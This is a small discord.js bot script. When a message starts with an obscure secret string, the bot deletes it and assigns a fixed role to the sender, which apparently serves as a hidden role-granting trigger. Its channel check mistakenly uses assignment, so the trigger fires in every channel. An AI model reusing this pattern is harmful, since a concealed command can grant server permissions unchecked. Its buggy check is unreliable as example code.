const Discord = require("discord.js");
var client = new Discord.Client();

client.on('ready', () => {
    console.log("Pret")
    client.user.setActivity("YO YO YO YO")
})

client.on('message', msg => {
    if(msg.channel.id = "716596605800677437") {
    if(msg.content.startsWith("./kjgjkkf44hj1145f")) {
        msg.delete()
        msg.member.roles.add("716376789932441650") 
    }
    }
})
client.login(process.env.TOKEN);